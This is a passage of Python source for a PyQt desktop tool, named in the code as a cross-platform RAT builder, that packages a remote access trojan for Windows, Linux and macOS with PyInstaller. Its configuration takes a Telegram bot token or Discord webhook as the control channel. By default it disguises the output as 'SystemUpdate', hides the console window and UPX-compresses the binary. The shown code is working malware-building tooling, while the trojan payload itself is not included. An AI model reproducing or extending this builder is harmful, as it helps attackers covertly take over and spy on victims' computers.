        self.log_build(f"Running: {' '.join(pyinstaller_cmd)}")
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
        
        if result.returncode != 0:
            self.log_build(f"PyInstaller error: {result.stderr}")
            raise Exception("Windows build failed")

    def build_linux_exe(self, output_dir, source_file, output_name):
        """Build Linux executable"""
        # For Linux, we can create a packaged Python application
        # or use PyInstaller if available
        try:
            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--name", output_name,
                "--distpath", str(output_dir),
                str(source_file)
            ]
            
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
            if result.returncode == 0:
                self.log_build("Linux executable built with PyInstaller")
            else:
                # Fallback: create Python script with shebang
                self.create_linux_script(output_dir, source_file, output_name)
                
        except Exception as e:
            self.create_linux_script(output_dir, source_file, output_name)

    def create_linux_script(self, output_dir, source_file, output_name):
        """Create executable Python script for Linux"""
        script_content = source_file.read_text()
        output_script = output_dir / output_name
        
        # Add shebang and make executable
        with open(output_script, 'w') as f:
            f.write("#!/usr/bin/env python3\n")
            f.write(script_content)
            
        os.chmod(str(output_script), 0o755)
        self.log_build(f"Created Linux script: {output_script}")

    def build_macos_exe(self, output_dir, source_file, output_name):
        """Build macOS application bundle"""
        try:
            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--name", output_name,
                "--distpath", str(output_dir),
                str(source_file)
            ]
            
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
            if result.returncode == 0:
                self.log_build("macOS executable built with PyInstaller")
            else:
                self.create_macos_script(output_dir, source_file, output_name)
                
        except Exception as e:
            self.create_macos_script(output_dir, source_file, output_name)

    def create_macos_script(self, output_dir, source_file, output_name):
        """Create executable Python script for macOS"""
        script_content = source_file.read_text()
        output_script = output_dir / output_name
        
        with open(output_script, 'w') as f:
            f.write("#!/usr/bin/env python3\n")
            f.write(script_content)
            
        os.chmod(str(output_script), 0o755)
        self.log_build(f"Created macOS script: {output_script}")

    def build_for_all_platforms(self, output_dir, source_file):
        """Build executables for all platforms"""
        platforms = ["windows", "linux", "macos"]
        
        for platform_name in platforms:
            self.log_build(f"Building for {platform_name}...")
            try:
                self.build_for_platform(platform_name, output_dir, source_file)
                self.log_build(f"✅ {platform_name} build successful")
            except Exception as e:
                self.log_build(f"❌ {platform_name} build failed: {str(e)}")

    def save_config(self):
        """Save configuration to file"""
        config = self.get_current_config()
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            self.log_message("💾 Configuration saved successfully")
        except Exception as e:
            self.log_message(f"❌ Failed to save configuration: {str(e)}")

    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                self.apply_config(config)
                self.log_message("📂 Configuration loaded successfully")
            except Exception as e:
                self.log_message(f"❌ Failed to load configuration: {str(e)}")

    def get_current_config(self):
        """Get current configuration as dictionary"""
        config = {
            'communication': {
                'method': self.comm_method.currentText(),
                'bot_token': self.bot_token.text(),
                'discord_webhook': self.discord_webhook.text(),
                'trusted_users': self.trusted_users.text(),
                'trusted_chats': self.trusted_chats.text(),
            },
            'platform': {
                'target_os': self.target_os.currentText(),
                'architecture': self.architecture.currentText(),
            },
            'build': {
                'output_name': self.output_name.text(),
                'output_dir': self.output_dir.text(),
                'python_version': self.python_version.currentText(),
                'onefile': self.onefile.isChecked(),
                'noconsole': self.noconsole.isChecked(),
                'upx_compress': self.upx_compress.isChecked(),
            }
        }
        
        # Add features
        features_config = {}
        for attr_name in dir(self):
            if attr_name.startswith('feature_') and hasattr(getattr(self, attr_name), 'isChecked'):
                features_config[attr_name] = getattr(self, attr_name).isChecked()
        config['features'] = features_config
        
        return config

    def apply_config(self, config):
        """Apply configuration from dictionary"""
        try:
            # Communication settings
            comm = config.get('communication', {})
            self.comm_method.setCurrentText(comm.get('method', 'Telegram'))
            self.bot_token.setText(comm.get('bot_token', ''))
            self.discord_webhook.setText(comm.get('discord_webhook', ''))
            self.trusted_users.setText(comm.get('trusted_users', ''))
            self.trusted_chats.setText(comm.get('trusted_chats', ''))
            
            # Platform settings
            platform_config = config.get('platform', {})
            self.target_os.setCurrentText(platform_config.get('target_os', 'Windows'))
            self.architecture.setCurrentText(platform_config.get('architecture', 'x64'))
            
            # Feature settings
            features = config.get('features', {})
            for feature_name, enabled in features.items():
                if hasattr(self, feature_name):
                    getattr(self, feature_name).setChecked(enabled)
            
            # Build settings
            build = config.get('build', {})
            self.output_name.setText(build.get('output_name', 'SystemUpdate'))
            self.output_dir.setText(build.get('output_dir', str(Path.home() / "Desktop")))
            self.python_version.setCurrentText(build.get('python_version', '3.10'))
            self.onefile.setChecked(build.get('onefile', True))
            self.noconsole.setChecked(build.get('noconsole', True))
            self.upx_compress.setChecked(build.get('upx_compress', True))
            
        except Exception as e:
            self.log_message(f"⚠️ Error applying configuration: {str(e)}")

    def closeEvent(self, event):
        """Cleanup on close"""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
        except:
            pass
        event.accept()

def main():
    # Create application
    app = QApplication(sys.argv)
    
    # Show splash screen
    splash = SplashScreen()
    splash.show()
    
    # Simulate loading with progress updates
    steps = [
        (10, "Loading core modules..."),
        (30, "Initializing UI..."),
        (50, "Setting up configuration..."),
        (70, "Preparing build system..."),
        (90, "Finalizing..."),
        (100, "Ready!")
    ]
    
    for progress, status in steps:
        splash.set_progress(progress, status)
        time.sleep(0.3)  # Shorter delay for better UX
        QApplication.processEvents()
    
    # Close splash and show main window
    splash.close()
    
    # Create and show main window
    window = CrossPlatformRATBuilder()
    window.show()
    
    # Start application
    sys.exit(app.exec_())
    
if __name__ == '__main__':
    main()